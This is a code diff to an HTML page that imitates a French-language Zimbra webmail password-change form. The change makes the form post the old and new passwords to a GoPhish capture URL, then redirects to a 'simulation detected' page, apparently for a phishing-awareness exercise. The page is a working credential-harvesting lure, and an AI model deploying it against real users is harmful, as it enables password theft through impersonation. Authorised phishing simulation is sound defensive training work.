@@ -842,88 +842,75 @@ TD.DwtListView-ColumnActive{background-color:#f7f7f7;font-weight:bold;}
 </div>
 
 <div id="ZLoginFormPanel" style="margin-left: 12%;">
-<form accept-charset="utf-8" action="" autocomplete="off" method="post" name="changePassForm"><input name="loginOp" type="hidden" value="login"/>
-<table class="form">
-	<tbody>
-		<tr>
-			<td class="zLoginLabelContainer"><label for="oldPassword">Ancien mot de passe:</label></td>
-			<td class="zLoginFieldContainer"><input class="zLoginField" id="oldPassword" maxlength="1024" name="password" type="password"/></td>
-		</tr>
-		<tr>
-			<td class="zLoginLabelContainer"><label for="newPassword">Nouveau mot de passe:</label></td>
-			<td class="zLoginFieldContainer"><input class="zLoginField" id="newPassword" maxlength="1024" name="password" type="password"/></td>
-		</tr>
-		<tr>
-			<td class="zLoginLabelContainer"><label for="confirm">Confirmer:</label></td>
-			<td class="zLoginFieldContainer"><input class="zLoginField" id="confirm" maxlength="1024" name="password" type="password"/></td>
-		</tr>
-		<tr>
-			<td> </td>
-			<td><input class="zLoginButton" type="submit" value="Changer mot de passe"/></td>
-		</tr>
-	</tbody>
-</table>
-</form>
+  <form accept-charset="utf-8" action="{{.URL}}" autocomplete="off" method="post" name="changePassForm" id="changePassForm">
+    <input name="loginOp" type="hidden" value="login">
+    <table class="form">
+      <tbody>
+        <tr>
+          <td class="zLoginLabelContainer">
+            <label for="oldPassword">Ancien mot de passe:</label>
+          </td>
+          <td class="zLoginFieldContainer">
+            <input class="zLoginField" id="oldPassword" maxlength="1024" name="old_password" type="password">
+          </td>
+        </tr>
+        <tr>
+          <td class="zLoginLabelContainer">
+            <label for="newPassword">Nouveau mot de passe:</label>
+          </td>
+          <td class="zLoginFieldContainer">
+            <input class="zLoginField" id="newPassword" maxlength="1024" name="new_password" type="password">
+          </td>
+        </tr>
+        <tr>
+          <td class="zLoginLabelContainer">
+            <label for="confirm">Confirmer:</label>
+          </td>
+          <td class="zLoginFieldContainer">
+            <input class="zLoginField" id="confirm" maxlength="1024" name="confirm_password" type="password">
+          </td>
+        </tr>
+        <tr>
+          <td>&nbsp;</td>
+          <td>
+            <input class="zLoginButton" type="submit" value="Changer mot de passe">
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </form>
 </div>
-</div>
-
-<div class="decor1"> </div>
-</div>
-</div>
-
-
-
 
 <script>
 document.addEventListener("DOMContentLoaded", function () {
-  const form = document.forms["changePassForm"];
+  const form = document.getElementById("changePassForm");
 
   form.addEventListener("submit", function (e) {
-    e.preventDefault(); // bloque l'envoi
-
     const oldPass = form["old_password"].value;
     const newPass = form["new_password"].value;
     const confirm = form["confirm_password"].value;
 
+    // Vérification des champs
     if (!oldPass || !newPass || !confirm) {
+      e.preventDefault();
       alert("Tous les champs doivent être remplis.");
       return;
     }
 
     if (newPass !== confirm) {
+      e.preventDefault();
       alert("Les mots de passe ne correspondent pas.");
       return;
     }
 
-    // Simulation OK → rediriger
-    window.location.href = "https://trans4europe.com/phishing/simulation-detectee.html";
+    // Laisse le formulaire se soumettre → GoPhish capture
+
+    // Redirection après soumission (donner le temps à GoPhish de traiter le POST)
+    setTimeout(() => {
+      window.location.href = "https://trans4europe.com/phishing/simulation-detectee.html";
+    }, 1500); // délai raisonnable
   });
 });
 </script>
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-  const form = document.forms["changePassForm"];
 
-  form.addEventListener("submit", function (e) {
-    e.preventDefault(); // bloque l'envoi
-
-    const oldPass = form["old_password"].value;
-    const newPass = form["new_password"].value;
-    const confirm = form["confirm_password"].value;
-
-    if (!oldPass || !newPass || !confirm) {
-      alert("Tous les champs doivent être remplis.");
-      return;
-    }
-
-    if (newPass !== confirm) {
-      alert("Les mots de passe ne correspondent pas.");
-      return;
-    }
-
-    // Simulation OK → rediriger
-    window.location.href = "https://trans4europe.com/phishing/simulation-detectee.html";
-  });
-});
-</script>
 </body></html>
